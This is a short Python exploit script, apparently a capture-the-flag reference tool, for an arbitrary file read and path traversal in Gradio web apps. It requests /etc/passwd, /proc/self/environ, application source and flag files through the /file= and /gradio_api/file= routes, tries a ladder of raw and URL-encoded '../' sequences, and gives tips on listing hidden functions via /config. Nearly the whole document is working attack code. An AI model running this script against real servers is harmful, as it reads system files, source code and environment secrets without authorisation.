#!/usr/bin/env python3
# [REFERENCE] Gradio arbitrary file read — /file= route (older Gradio <4.x; also
# probe /gradio_api/file= on newer prefix layouts). Gradio apps expose uploaded-file
# serving at /file=<path>; without canonicalization it reads ANY server path.
# Fingerprint: Gradio app (page has gradio-embeeded assets, /config endpoint JSON
# with "components"). Map surface first: GET /config -> deps (function ids), then
# /run/<id> and /call/<id> for hidden functions.
# Usage: python3 gradio-file-read-traversal.py http://TARGET:7860
import requests, sys, urllib.parse, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:7860"

TARGETS = ["/etc/passwd", "/proc/self/environ", "/flag", "/flag.txt", "/app/flag.txt",
           "/app/app.py", "/proc/self/cmdline"]
PREFIXES = ["/file=", "/gradio_api/file="]

def one(prefix, raw):
    return BASE + prefix + raw

print("--- raw absolute ---")
for p in PREFIXES:
    for t in TARGETS:
        r = requests.get(one(p, t), verify=False, timeout=10)
        hit = r.status_code == 200 and len(r.content) > 0 and (b"root:" in r.content or b"flag" in r.content.lower() or b"=" in r.content[:200])
        print("%s %-20s %-18s -> %s len=%d" % ("HIT " if hit else "    ", p, t, r.status_code, len(r.content)))

print("--- traversal ladder (raw + %2F track) ---")
for d in (1, 2, 3, 4, 6, 8, 10, 12):
    for form in ("../" * d, "..%2F" * d):
        r = requests.get(one("/file=", form + "etc/passwd"), verify=False, timeout=10)
        if r.status_code == 200 and b"root:" in r.content:
            print("HIT depth=%d form=%s" % (d, form[:12]))

# env & config: /config leaks component tree (hidden fns); /proc/self/environ leaks
# env vars (flags sometimes live there as decoys — check against the real flag
# wrapper format before submitting).
